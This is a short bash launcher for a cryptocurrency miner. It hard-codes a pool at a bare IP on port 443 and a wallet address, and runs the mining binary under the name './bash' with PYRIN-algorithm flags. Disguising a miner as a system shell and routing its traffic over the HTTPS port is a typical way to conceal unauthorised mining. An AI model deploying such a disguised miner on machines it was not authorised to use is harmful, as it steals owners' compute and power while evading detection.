#!/bin/bash

POOL=43.228.212.23:443
WALLET=KrPFQMNHhYbxQYtBtoVs7GvmqmWijinB1gg.Danis

./bash --algo PYRIN --pool $POOL --user $WALLET $@ --no-cl --lhrv3boost

